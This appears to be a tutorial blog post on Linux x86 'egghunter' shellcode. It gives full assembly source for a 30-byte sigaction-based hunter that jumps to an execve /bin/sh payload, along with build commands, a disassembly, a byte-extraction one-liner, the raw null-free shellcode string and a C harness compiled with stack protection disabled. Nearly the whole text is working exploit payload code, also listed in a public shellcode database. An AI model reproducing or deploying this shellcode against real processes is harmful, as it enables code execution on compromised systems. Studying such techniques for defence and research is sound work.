## Egghunter Shellcode

A Linux x86 assembly language program that enables a the user to perform a two stage operation from within a process. The first stage is the hunter, searching the memory of the compromised process for a specific marker, the egg, and upon finding the egg passing control to the shellcode payload. A working example of such code follows, this code is written to avoid NULL’s in order to be used as working shellcode. The main use of such code is in situations whereby the space within a process is at a premium and the payload is unable to be loaded in it’s entirety. Comments have been added for study purposes.
```nasm
; sigaction egghunter shellcode
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
 
global _start
section .text
_start:
pageinc:
    or   cx,0x0fff          ; page alignment and validation, 4095
addrinc:
    inc  ecx                ; increase address value
 
    ; Sigaction
    ; Function prototype:
    ;     int sigaction(int signum, const struct sigaction *act,
    ;          struct sigaction *oldact);
    ; Purpose:
    ;     Used to change an action by a process on receiving a specific
    ;     signal. Can handle any valid signal except for SIGKILL/SIGSTOP
    ;
    ;     Sigaction structure definition as per prototype:
    ;     struct sigaction {
    ;         void     (*sa_handler)(int);
    ;         void     (*sa_sigaction)(int, siginfo_t *, void *);
    ;         sigset_t   sa_mask;
    ;         int        sa_flags;
    ;         void     (*sa_restorer)(void);
    ;     };
    push 0x43               ; sigaction()
    pop  eax
    int  0x80               ; make the call
    cmp  al, 0xf2           ; test for EFAULT
    je   pageinc            ; EFAULT, access next page
    mov  eax,0x50905090     ; Marker code to find
    mov  edi,ecx            ; edi contains address to search
    scasd                   ; look for first marker
    jnz  addrinc            ; no marker found, next address
    scasd                   ; first marker found look for second
    jnz  addrinc            ; no marker found, next address
    jmp  edi                ; found markers jump to shellcode payload
 
    ; Marker bytes, enables hunter code to find the start of the
    ; shellcode payload, must be executable code to work correctly.
    nop                     ; 0x90
    push eax                ; 0x50
    nop
    push eax
    nop
    push eax
    nop
    push eax
 
    ; Execve
    ; Function prototype:
    ;     int execve(const char *fn, char *const argv[],
    ;         char *const envp[])
    ; Purpose:
    ;     to execute a program on a remote and/or compromised
    ;     system. There is no return from using execve therefore
    ;     an exit syscall is not required
    xor eax,eax             ; zero eax register
    xor edx,edx             ; zero edx register
    push edx                ; push null
    push 0x68732f6e         ; hs/n
    push 0x69622f2f         ; ib//
    mov ebx,esp             ; ebx contains address of //bin/sh
    push edx                ; push null
    push ebx                ; push address of //bin/sh
    mov ecx,esp             ; ecx pointer to //bin/sh
    push edx                ; push null
    mov edx,esp             ; edx contains pointer to null
    mov al,0xb              ; execve()
    int 0x80                ; make the call
```
Build the code:
```
$ nasm -felf32 -o egghunter.o egghunter.asm
$ ld -o egghunter egghunter.o
```
Check for nulls:
```
$ objdump -D egghunter -M intel
egghunt:     file format elf32-i386
Disassembly of section .text:
08048060 <_start>:
 8048060:   66 81 c9 ff 0f          or     cx,0xfff
08048065 <addrinc>:
 8048065:   41                      inc    ecx
 8048066:   6a 43                   push   0x43
 8048068:   58                      pop    eax
 8048069:   cd 80                   int    0x80
 804806b:   3c f2                   cmp    al,0xf2
 804806d:   74 f1                   je     8048060 <_start>
 804806f:   b8 90 50 90 50          mov    eax,0x50905090
 8048074:   89 cf                   mov    edi,ecx
 8048076:   af                      scas   eax,DWORD PTR es:[edi]
 8048077:   75 ec                   jne    8048065 <addrinc>
 8048079:   af                      scas   eax,DWORD PTR es:[edi]
 804807a:   75 e9                   jne    8048065 <addrinc>
 804807c:   ff e7                   jmp    edi
 804807e:   90                      nop
 804807f:   50                      push   eax
 8048080:   90                      nop
 8048081:   50                      push   eax
 8048082:   90                      nop
 8048083:   50                      push   eax
 8048084:   90                      nop
 8048085:   50                      push   eax
 8048086:   31 c0                   xor    eax,eax
 8048088:   31 d2                   xor    edx,edx
 804808a:   52                      push   edx
 804808b:   68 6e 2f 73 68          push   0x68732f6e
 8048090:   68 2f 2f 62 69          push   0x69622f2f
 8048095:   89 e3                   mov    ebx,esp
 8048097:   52                      push   edx
 8048098:   53                      push   ebx
 8048099:   89 e1                   mov    ecx,esp
 804809b:   52                      push   edx
 804809c:   89 e2                   mov    edx,esp
 804809e:   b0 0b                   mov    al,0xb
 80480a0:   cd 80                   int    0x80
```
Test above executable on localhost:
Open a terminal under working directory,

$ ./egghunter

The result of this will be a new /bin/sh

$

The test is to make sure things work rather than attempt to be an example of real world usage, as in reality the shellcode payload will not be as near to the hunter, otherwise there would most likely be no need for such a method. A more grounded example will be provided later in this post.

Get shellcode from executable:
Use the following from the commandlinefu website replacing PROGRAM with the name of the required executable like so
```bash
$ objdump -d ./egghunter | grep ‘[0-9a-f]:’ | grep -v ‘file’ | cut -f2 -d: | cut -f1-6 -d’ ‘ | tr -s ‘ ‘ | tr ‘t’ ‘ ‘ | sed ‘s/ $//g’ | sed ‘s/ /x/g’ | paste -d ” -s | sed ‘s/^/”/’ | sed ‘s/$/”/g’

“\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf
\x75\xec\xaf\x75\xe9\xff\xe7\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x31\xd2\x52\x68\x6e\x2f
\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80”
```
For a more complete analysis of what is going on within the shellcode and the choice of sigaction as a system call, I can do no better than to point you to section 3.1.3 sigaction(2), page 13 of the aformentioned paper. I would be doing a great injustice to this work to try and replicate it here in my own words. With that, a more complete and useful shellcode example is presented below.
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
  
/*
 * Marker code must be executable, currently:
 *   \x90 nop
 *   \x50 push eax
 */
#define MARKER "\x90\x50" 
  
char hunter[] = 
    "\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1"
    "\xb8"MARKER""MARKER"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
char marker[] = MARKER; 
char shellcode[] = 
    "\x31\xc0\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
    "\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";
  
int
main(void) 
{
    int i=0, nmarkers = 4, markerlen = sizeof(marker)-1;
    /* 
     * Setup area of memory for testing,
     * place marker and shellcode into area.
     */
    char *egg = malloc(128);
    memcpy(egg+(markerlen*nmarkers), shellcode, sizeof(shellcode)-1);
    do {
        memcpy(egg+i, marker, markerlen);
        i += markerlen;
    } while(i != (markerlen * nmarkers));
    /*
     * Run hunter to search for marker and jump to shellcode 
     */
    int (*ret)() = (int(*)())hunter;
    ret();
    free(egg);
    return 0;
}
```
In the above C source code the shellcode is split into more meaningful sections. This allows for flexibility, in that markers, memory ranges, etc. can all be changed, allowing for various testing scenarios and giving ample opportunity to segfault on whim! I have tried to make the source code dynamic with as few hardcoded values as possible.

Build the code:
```
$ gcc -fno-stack-protector -z execstack -o egghunter egghunter.c
```
The options for gcc are to disable stack protection and enable stack execution respectively. Without these options the code will cause a segfault.

Test above executable on a localhost:

$ ./egghunter

the system after a second, or two depending on your memory scheme, will return a new /bin/sh

$

The hunter shellcode above currently weighs in at 30 bytes. With further research the codebase could possibly be reduced, especially on architectures other than x86, but I strongly suspect that the robust nature of the code would be compromised, this is not to say that in certain scenarios a more optimal yet unstable solution would be required.

Note:
The code and the majority of my research into egghunter shellcode is based on the work ‘Safely Searching Process Virtual Address Space‘ by mmiller@hick.org. 
This is an excellent and informative paper, which for me was enlightening as to how much within the box my thinking has become. I am truly grateful for authors who take the time to share their knowledge, especially on such subjects.

Shell-storm database entry: http://shell-storm.org/shellcode/files/shellcode-850.php
